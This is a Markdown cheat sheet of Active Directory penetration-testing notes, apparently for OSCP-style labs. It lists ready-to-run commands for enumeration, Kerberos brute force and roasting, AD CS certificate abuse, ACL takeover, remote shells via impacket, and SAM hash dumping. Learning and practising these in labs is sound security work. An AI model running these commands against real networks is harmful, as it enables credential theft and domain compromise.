# Table of Content
<!-- TOC -->

- [Table of Content](#table-of-content)
- [Useful links](#useful-links)
    - [Scripts and tools tipically in /opt/tools](#scripts-and-tools-tipically-in-opttools)
- [Enumeration](#enumeration)
    - [Tools](#tools)
        - [SMBclient recursively get all](#smbclient-recursively-get-all)
        - [Default credentials](#default-credentials)
        - [Mount smb shares or VHD Virtual Disk](#mount-smb-shares-or-vhd-virtual-disk)
    - [Privilege Escalation](#privilege-escalation)
        - [Bloodhound](#bloodhound)
- [Exposed password in clear in domain Group Policy GPP](#exposed-password-in-clear-in-domain-group-policy-gpp)
- [Kerberos Attacks](#kerberos-attacks)
    - [Brute force](#brute-force)
    - [ASREP roast](#asrep-roast)
    - [Kerberoasting](#kerberoasting)
    - [TargetedKerberoasting GenericWrite](#targetedkerberoasting-genericwrite)
    - [Kerberos Certificate Misconfiguration exploit](#kerberos-certificate-misconfiguration-exploit)
        - [ESC4](#esc4)
        - [ESC1](#esc1)
- [Dangerous privilege](#dangerous-privilege)
    - [SeBackupPrivilege](#sebackupprivilege)
    - [WriteOwner privilege](#writeowner-privilege)
- [Certipy-AD](#certipy-ad)
- [Grant FullControl rights](#grant-fullcontrol-rights)
- [Obtain system shell without EvilWinRM](#obtain-system-shell-without-evilwinrm)
- [SAM / SYSTEM hashes dump](#sam--system-hashes-dump)
- [Add user to a group Generic All](#add-user-to-a-group-generic-all)
- [](#)
- [notes from adri TODO](#notes-from-adri-todo)

<!-- /TOC -->

# Useful links

 - [Active Directory Pentest MindMap](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)
 - [0-9 Guide to Active Directory Attacks](https://zer1t0.gitlab.io/posts/attacking_ad/)
 - [OSCP-like Labs and Machines](https://docs.google.com/spreadsheets/d/18weuz_Eeynr6sXFQ87Cd5F0slOj9Z6rt/edit?pli=1&gid=487240997#gid=487240997)
 - [Kerberos Attacks explained](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 - [InternalAllTheThings repository](https://swisskyrepo.github.io/InternalAllTheThings/)
 - [BloodyAD guide](https://notes.incendium.rocks/pentesting-notes/windows-pentesting/tools/bloodyad)

## Scripts and tools (tipically in /opt/tools)

- [BloodHound GUI](https://bloodhound.readthedocs.io/en/latest/installation/linux.html)
- [TargetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast/tree/main)

# Enumeration
search for:
- shares
- groups
- RIDs
- list Certificates
- list ACL permissions
- collect Bloodhound files


try using default credentials like `guest` and no password\
repeat enumeration with any other users you find access to

## Tools
1. crackmapexec:
    - `crackmapexec smb {host} --shares {-u '' -p ''}`
    - `crackmapexec smb {host} --rid-brute`
2. nxc:kerbe
    - `nxc smb {host} --shares {-u guest -p ''}`
    - `nxc ldap {host} {-M group-mem -o group="Remote Managment Users"}`
    - `nxc smb {host} --rid-brute`
    - `nxc smb {host} --users`
3. smbclient:
    - `smbclient -L HOST`
    - `smbclient HOST\SHARE {- U user%password}`
4. impacket:
    - `impacket-lookupsid {host} {-no-pass}`
5. evilwinrm:
    - use it every time with every new users and {password} you find. Also check it with `nxc ldap` because sometimes it doesnt work
6. smbmap:
    - `smbmap -H {target}`

### SMBclient recursively get all
---
```
recurse ON;
prompt OFF;
mget *;
```
### Default credentials
---
- smb: `-u 'guest' -p ''`

### Mount smb shares or VHD (Virtual Disk)
---
in order to navigate and search for files easily:
- `mount //{host}/{share} /{mount-point} -o user={smb_user},password={smb_password}`

to mount a VHD disk (which is usually too bid to download):
- `guestmount -a {vhd_path} -ir {mount_point}` or just connect to the smb shares using a Windows machine

## Privilege Escalation
- check permission: `whoami /all`
- search for vulnerable certificates
- winPEAS
- explore "Program files" folders for installed apps

### Bloodhound
1. Collect data
    - `bloodhound-python -u {user} -p {password} -d {domain} -ns ip -c All`
    - `nxc ldap {host} -u {user} -p {password} --bloodhound -c All`
2. Import and query

# Exposed password in clear in domain Group Policy (GPP)
if you find GPP on the smb shares or somewhere, Microsoft pubblished the static AES key. [Learn more.](https://www.mindpointgroup.com/blog/privilege-escalation-via-group-policy-preferences-gpp)
- you can use `gpp-decrypt` to crack it.

# Kerberos Attacks
Enumerate possibile lateral movement. These following attacks are ordered by the privileges required, from lower to highest. [Learn more.](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

## Brute force
This attacks is efficient on Kerberos due to its verbosity; it indicates whether the username is wrong or not, for example.\
No privilege is required.

The most common tool is [kerbrute](https://github.com/TarlogicSecurity/kerbrute):
- `python3 kerbrute.py -domain {domain} -usersfile users.txt -passwords passwords.txt -outputfile output.txt`

## ASREP roast

The requirements here is having at least one user without Kerberos `pre-authentication` required. This allows any users to request an `AS_REP` on behalf of any other user and try cracking it to discover the user's password:
- `impacket-GetNPUsers {domain}/ -userfile users.txt {-format hashcat -outputfile output.txt}`

## Kerberoasting

To perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required.

The goal is to search for users that are configured with a SPN, so this means that they act kind of as as Service for which we can requests a TGS to Kerberos, which will be encrypted with the user secret shared key (usually shorted than an actual service/machine password) so then try to crack it:
- `impacket-GetUserSPNs {domain}/{user}:{password} {-request} {-userfile users.txt}`

## TargetedKerberoasting (GenericWrite)

can happen when you have some sort of privilege that lets you set a SPN for a specific user so that they become vulnerable to classic Kerberoasting
- `targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword' --request-user 'target-user'`


## Kerberos Certificate Misconfiguration exploit

Weak ACLs refer to access control entries (ACEs) that grant excessive permissions to unauthorized users or groups. hese permissions allow attackers to modify the template’s properties or even the ACL itself, potentially leading to domain escalation.

Requirements (any):
```
Rights 	        |   Description
----------------------------------------------------------------------------
Owner 	        |   Implicit full control of object, all properties can be edited
WriteOwner 	    |   Can modify the owner to an attacker-controlled principal
WriteDacl 	    |   Can modify rights to grant attacker FullControl rights
WriteProperty 	|   Can edit all properties
FullControl 	|   Full control of object, all properties can be edited
```

### ESC4
---
ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.
- update certificate cache to the vulnerable one:   \
`KRB5CCNAME=$PWD/{user}.ccache certipy-ad template -k -template {vulnerable_template_anem} -dc-ip {ip} -target {dc.domain}`
- then requests the certificate for the user you want to escalate to, using that template:\
`certipy-ad req -u {user} -hashes '{hash}' -ca {CN: certificate_subject} -target {domain} -dc-ip  {ip}  -template DunderMifflinAuthentication -upn administrator@{domain} -ns  {ip}  -dns  {ip}  -debug`
- finally you get the hash using the export pfx file:\
`certipy-ad auth -pfx administrator_10.pfx  -domain {domain}`

so you log in with evil-winrm using the second part of the HASH

### ESC1
---
ESC1 is the label for a category of misconfigurations that allows attackers to trick AD CS into issuing them certificates that they can use to authenticate as privileged users.

# Dangerous privilege

## SeBackupPrivilege
Enable privileges using [giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege.git) github repository.

```PS
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege
Get-SeBackupPrivilege

# Retrieve sensitive files
Copy-FileSeBackupPrivilege C:\Users\Administrator\flag.txt C:\Users\Public\flag.txt -Overwrite
```

## WriteOwner privilege
change owner of a user:
- bloodyAD:\
    `bloodyAD --host '{ip}' -d '{domain}' -u '{user}' -p '{password}' set owner '{target_user}' '{user}'`
- impacket:\
`impacket-owneredit -action write -new-owner '{user}' -target '{target_user}' 'domain'/'{user}':'{password}'`
- PowerView:\
`Set-DomainObjectOwner -TargetIdentity {target_user} -PrincipalIdentity {user}`

# Certipy-AD
when you already have a user you can try to extract hashes for other users [learn more](https://www.hackingarticles.in/shadow-credentials-attack/):

- `certipy-ad shadow auto -u '{user}@{domain}' -p "{password}" -account '{target_user}' -dc-ip '{ip}'`

and also search for vulnerable certificates if you can access the CA_SVC account:
- `certipy-ad find -u {user}@{domain} -hashes :{hash} -stdout -vulnerable -dc-ip {ip} {-old-bloodhound}`

# Grant FullControl rights
- PowerView
`Add-DomainObjectAcl -TargetIdentity {target_user} -PrincipalIdentity {user} -Rights fullcontrol`
- impacket
`impacket-dacledit -action write -rights FullControl -principal {user} -target {target_user} {domain}/{user}:{password}`

# Obtain system shell without EvilWinRM

when there is no user in the "Remote Management Group" you can still obtain a shell with any of the following:
- `impacket-psexec {domain}/{user}:{password}@{ip}`
- `impacket-wmiexec {domain}/{user}:{password}@{ip}`
- `impacket-smbexec {domain}/{user}:{password}@{ip}`

# SAM / SYSTEM hashes dump

with full access to filesystem, you can read and dump SAM (Security Account Manager) file which is a DB for hashes.\
Sometimes it is locked and impossible to access, but if you have a backup or a copy of it you can.

- `secretsdump.py -sam {sam_file} -security {security_file} -system {system_file} {target}`

# Add user to a group (Generic All)

with Generic All permissions you can change your group membership.

- `net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"`
- `bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :0109d7e72fcfe404186c4079ba6cf79c add groupMember 'Administrators' test`

# 

# notes from adri TODO

utile anche usare nxc con --debug

a volte nxc si autentica ma altri tool no. Anche bloodhound. Cercando si nota che quando l'autenticazione funziona è perchè va trmaite Kerboros quindi va usata l'opzione -k

impacket-gettgt to bypass all and authenticate with kerberos


guarda il gruppo remote managment con bloodhound e marca come high value gli utenti che ne fanno parte

ogni volta che fai un upadte di utenzza gruppo ecc, bisdogna rigenerare il TGT kerberos se usato
